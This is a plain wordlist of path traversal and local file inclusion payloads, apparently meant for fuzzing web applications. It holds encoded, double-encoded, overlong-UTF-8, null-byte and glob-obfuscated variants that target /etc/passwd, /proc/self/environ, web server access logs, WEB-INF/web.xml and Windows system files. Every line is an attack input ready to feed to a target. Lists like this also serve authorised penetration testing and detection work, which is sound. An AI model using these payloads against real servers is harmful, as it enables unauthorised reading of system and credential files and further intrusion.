/e?c/?asswd
/e*c/*asswd
/??c/?asswd
/??c/?assw?
/etc/./passwd
/etc//passwd
////etc/passwd
/./././etc/passwd
/etc%2fpasswd
/etc%2Fpasswd
/etc%252fpasswd
/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/%252e%252e/%252e%252e/%252e%252e/etc/passwd
/..%2F..%2F..%2Fetc%2Fpasswd
/..%252F..%252F..%252Fetc%252Fpasswd
/../../../etc/passwd
/....//....//....//etc/passwd
/..././..././..././etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd
/etc%00/passwd
/etc/\x00/passwd
/etc\x5cpasswd
%2f%2e%2e%2fetc%2fpasswd
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/version
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
WEB-INF/web.xml
../WEB-INF/web.xml
../../WEB-INF/web.xml
../../../WEB-INF/web.xml
/windows/system32/drivers/etc/hosts
\windows\system32\drivers\etc\hosts
..\..\..\..\windows\system32\drivers\etc\hosts
/boot.ini
/c:/boot.ini
/c:/windows/system32/drivers/etc/hosts
